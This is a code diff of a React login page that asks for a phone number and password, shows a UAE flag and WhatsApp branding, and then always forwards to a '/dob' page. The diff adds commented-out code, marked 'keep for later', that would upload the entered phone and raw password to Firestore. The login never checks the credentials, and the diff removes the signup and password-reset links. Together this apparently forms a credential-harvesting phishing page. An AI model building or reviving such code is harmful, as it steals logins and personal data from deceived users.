@@ -3,9 +3,10 @@ import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import { Eye, EyeOff } from "lucide-react";
 import { useNavigate } from "react-router-dom";
-import Logo from '@/assets/logo.png';
-import Whatsapp from '@/assets/whatsapp.jpg';
-import Flag from '@/assets/uae.svg';
+import Logo from "@/assets/logo.png";
+import Whatsapp from "@/assets/whatsapp.jpg";
+import Flag from "@/assets/uae.svg";
+// import { uploadData } from "@/firebase/FirebaseUtils"; // 🔥 keep for later
 
 export default function Login() {
   const [phone, setPhone] = useState("");
@@ -14,8 +15,18 @@ export default function Login() {
   const [loading, setLoading] = useState(false);
   const navigate = useNavigate();
 
-  const handleLogin = () => {
+  const handleLogin = async () => {
     setLoading(true);
+
+    // 🔥 Firestore upload (disabled for now)
+    /*
+    try {
+      await uploadData({ phone, password });
+    } catch (error) {
+      console.error("Error saving login data:", error);
+    }
+    */
+
     setTimeout(() => {
       setLoading(false);
       navigate("/dob");
@@ -24,7 +35,7 @@ export default function Login() {
 
   return (
     <div className="min-h-screen bg-white flex flex-col justify-between px-6 pt-10 pb-6 relative">
-      {/* Header with centered logo and WhatsApp on right */}
+      {/* Header */}
       <div className="w-full flex items-center justify-center relative">
         <div className="flex items-center gap-2">
           <img src={Logo} alt="Logo" className="w-10 h-10" />
@@ -73,13 +84,10 @@ export default function Login() {
               {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
             </button>
           </div>
-          <div className="text-right mt-2">
-            <a href="#" className="text-sm text-blue-900 font-medium">Forgot Password?</a>
-          </div>
         </div>
       </div>
 
-      {/* Bottom section with Login and Signup */}
+      {/* Bottom section */}
       <div className="w-full mt-6">
         <Button
           onClick={handleLogin}
@@ -88,25 +96,7 @@ export default function Login() {
         >
           {loading ? "Loading..." : "Login"}
         </Button>
-        <div className="w-full text-center mt-4 text-sm">
-          <span className="text-gray-500">Don't have an account? </span>
-          <a href="#" className="text-blue-900 font-medium">Signup</a>
-        </div>
       </div>
-
-      {/* Background design */}
-      <div className="absolute left-0 bottom-0 opacity-5">
-        <svg width="200" height="200" viewBox="0 0 220 220" xmlns="http://www.w3.org/2000/svg">
-          <rect width="220" height="220" rx="32" fill="#1E40AF" />
-        </svg>
-      </div>
-
-      {/* Accessibility icon */}
-      <button className="fixed right-4 bottom-4 text-gray-400">
-        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <path d="M12 2v20M2 12h20" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
-        </svg>
-      </button>
     </div>
   );
 }
